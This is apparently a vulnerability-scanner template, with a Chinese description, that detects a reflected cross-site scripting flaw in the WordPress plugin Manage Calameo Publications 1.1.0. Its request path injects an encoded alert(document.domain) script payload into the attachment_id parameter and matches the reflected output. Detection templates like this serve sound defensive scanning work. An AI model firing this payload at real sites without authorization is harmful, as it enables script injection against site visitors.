id: calameo-publications-xss

info:
  name: WordPress Manage Calameo Publications 1.1.0 - 跨站脚本漏洞
  author: DhiyaneshDK
  severity: medium
  description: |
    该模板用于检测 WordPress Manage Calameo Publications 1.1.0 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://codevigilant.com/disclosure/wp-plugin-athlon-manage-calameo-publications-a3-cross-site-scripting-xss/
    - https://wpscan.com/vulnerability/83343eb3-bb4c-4b82-adf6-745882f872cc
    - https://wordpress.org/plugins/athlon-manage-calameo-publications/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
  tags: wordpress,wp-plugin,xss,wpscan,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'ath_upload_calameo_publication(id\"><script>alert(document.domain)</script>&)'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
